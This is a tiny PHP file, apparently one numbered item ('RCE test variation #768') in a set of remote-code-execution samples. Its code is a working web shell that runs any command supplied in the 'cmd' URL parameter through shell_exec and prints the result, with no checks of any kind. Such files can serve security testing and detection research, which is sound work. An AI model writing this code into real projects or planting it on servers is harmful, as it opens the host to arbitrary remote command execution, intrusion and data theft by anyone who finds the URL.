<?php
// RCE test variation #768
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>